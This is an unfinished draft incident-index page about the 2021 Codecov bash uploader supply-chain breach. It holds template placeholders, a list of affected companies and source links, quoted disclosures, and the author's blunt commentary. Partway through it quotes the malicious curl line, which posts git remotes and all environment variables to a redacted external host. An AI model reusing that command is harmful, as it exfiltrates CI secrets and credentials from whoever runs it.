---
title: "Codecov"
date: 2023-04-16T07:55:47-04:00

description: "Update this with a social media and SEO synopsis"

# Set to false before publishing
draft: true

# This is not used for SEO, but allows users on the site to view incidents by keyword
tags: ["SupplyChain", "GCP"]

showToc: true # Do not change
author: "Chris Farris"
author_url: "https://www.chrisfarris.com/"

# These details are used to populate the Incident Index page.
victim: "Codecov"
incident_start_date: 2021-01-31
incident_end_date: 2021-04-01
disclosure_date: 2021-04-15
final_status: "Perpetrator Unknown"

---

Form a brief synopsis of the incident. No more than two to three paragraphs.

<!--more--> <!-- This separates the synopsis from the main body -->

## Incident

### Details of the Incident

### Attribution / Perpetrator

### Long-term impact

Other companies impacted:
* [Hashicorp](https://discuss.hashicorp.com/t/hcsec-2021-12-codecov-security-event-and-hashicorp-gpg-key-exposure/23512)
* [Twillio](https://www.twilio.com/blog/response-to-the-codecov-vulnerability)
* [Rapid7](https://www.rapid7.com/blog/post/2021/05/13/rapid7s-response-to-codecov-incident/)
* [Mercari](https://www.bleepingcomputer.com/news/security/e-commerce-giant-suffers-major-data-breach-in-codecov-incident/)
* [Monday](https://monday.com/blog/news/monday-coms-response-to-the-recent-codecov-vulnerability/)
* [Coalition](https://www.coalitioninc.com/blog/incident-report-in-response-to-the)

## Summary of coverage
* Source: [News Article One](FIXME) Month, Day, Year
* Source: [News Article Two](FIXME) Month, Day, Year
* [Press Release](FIXME) Month, Day, Year
* Codecov: [Bash Uploader Security Update](https://about.codecov.io/security-update/) April 15th, 2021
* Codecov: [Introducing Codecov’s New Uploader](https://about.codecov.io/blog/introducing-codecovs-new-uploader/) June 9th, 2021

https://snyk.io/blog/codecov-ceo-cto-share-learnings-from-breach-tsd/ <- PodCast

https://blog.gitguardian.com/codecov-supply-chain-breach/

https://www.reuters.com/technology/us-investigators-probing-breach-san-francisco-code-testing-company-firm-2021-04-16/
https://www.reuters.com/technology/codecov-hackers-breached-hundreds-restricted-customer-sites-sources-2021-04-19/ (paywall)

https://www.bleepingcomputer.com/news/security/hundreds-of-networks-reportedly-hacked-in-codecov-supply-chain-attack/
https://www.securityweek.com/codecov-bash-uploader-dev-tool-compromised-supply-chain-hack/
https://www.securityweek.com/twilio-hashicorp-among-codecov-supply-chain-hack-victims/
https://www.securityweek.com/codecov-kills-bash-uploader-blamed-supply-chain-hack/
https://www.securityweek.com/rapid7-source-code-exposed-codecov-supply-chain-attack/


## Cloud Security Implications of this incident.

>Based upon the forensic investigation results to date, it appears that there was periodic, unauthorized access to a Google Cloud Storage (GCS) key beginning January 31, 2021, which allowed a malicious third-party to alter a version of our bash uploader script to potentially export information subject to continuous integration (CI) to a third-party server. Codecov secured and remediated the script April 1, 2021. https://about.codecov.io/security-update/


> If CodeCov had required all users to disclose personal information like an email address, then reaching everyone post-breach would have been simple. Giving customers the option to utilize a social signer allowed them to keep their personal data more private, but also led to serious hurdles when urgent communication was needed. Would CodeCov’s disclosure process have looked different if notifying users was as simple as a mass email? Most likely not. As Hooten said, “I think you'll know you're doing it right, when the answer is obvious, even if the way ahead is painful or difficult.” The value structure at the core of CodeCov would have pushed its team toward transparency regardless. (https://snyk.io/blog/codecov-ceo-cto-share-learnings-from-breach-tsd/)


Holy Fuck, it took two months for someone to bother to validate the checksums on the file?
> One customer of Codecov realized that the (correct) shasum listed on Codecov’s GitHub didn’t match with the shashum (hash or “file fingerprint”, a Linux program that calculates and verifies SHA-1 hashes) of the Bash Uploader script present on the website. Hadn’t this been the case, the infiltration would have been of a different degree – nothing less than a previously known SolarWinds Sunburst attack. https://www.sisainfosec.com/blogs/codecov-breach-all-questions-answered/



Seriously, this is bad. We need to stop:
```bash
curl -sm 0.5 -d “$(git remote -v)<<<<<< ENV $(env)” https://<redacted>/upload/v2 || true
```

GitHub jumped in to help:
> On April 22, 2021 we received a notification from GitHub, a third party code hosting platform, that suspicious activity had been detected in our account related to the Codecov event, and indicating that a read-only Coalition user token used by Codecov to access our Github account may have been exposed. This immediately triggered our security incident response process, and with the help of GitHub we identified a set of GitHub repositories that had been cloned by the attacker on April 12, 2021 prior to Codecov’s public disclosure of the breach. https://www.coalitioninc.com/blog/incident-report-in-response-to-the
